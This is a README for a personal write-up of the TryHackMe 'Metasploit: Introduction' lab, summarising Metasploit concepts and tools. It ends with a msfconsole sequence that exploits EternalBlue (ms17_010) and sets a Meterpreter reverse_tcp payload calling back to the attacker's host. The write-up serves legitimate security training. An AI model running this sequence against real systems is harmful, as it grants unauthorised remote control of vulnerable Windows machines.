# Metasploit: Introduction (TryHackMe)

This repository documents my hands-on walkthrough and key learnings from the **"Metasploit: Introduction"** room on [TryHackMe](https://tryhackme.com/room/metasploitintro). This room introduces the essential components of the Metasploit Framework and guides through a basic exploitation scenario using the famous EternalBlue vulnerability.

---

## Room Overview

- **Platform**: TryHackMe  
- **Difficulty**: Easy  
- **Category**: Exploitation Basics  
- **Focus**: Metasploit Framework, msfconsole, module usage, EternalBlue exploitation

---

## Key Concepts Learned

- Structure and functionality of the Metasploit Framework
- Navigating and using `msfconsole`
- Working with **Metasploit modules**:
  - Exploits
  - Payloads
  - Auxiliary modules
  - Encoders and NOPs
- Using `search`, `use`, `set`, `run` commands
- Exploiting `ms17_010` (EternalBlue) vulnerability using Metasploit

---

## Tools Used

- **Kali Linux**
- **Metasploit Framework**
- **TryHackMe AttackBox**
- **Windows 7 vulnerable VM (ms17_010)**

---

## Completion
![Room Completion](https://github.com/MayankQuery/tryhackme-writeups/blob/main/metasploit-introduction/images/metasploit-introduction-completion.png)
![Room Practice](https://github.com/MayankQuery/tryhackme-writeups/blob/main/metasploit-introduction/images/metasploit-introduction-practice.png)

---

## Exploitation Summary

```bash
msf > search ms17_010
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(...) > set RHOSTS [Target IP]
msf exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(...) > set LHOST [Your IP]
msf exploit(...) > exploit



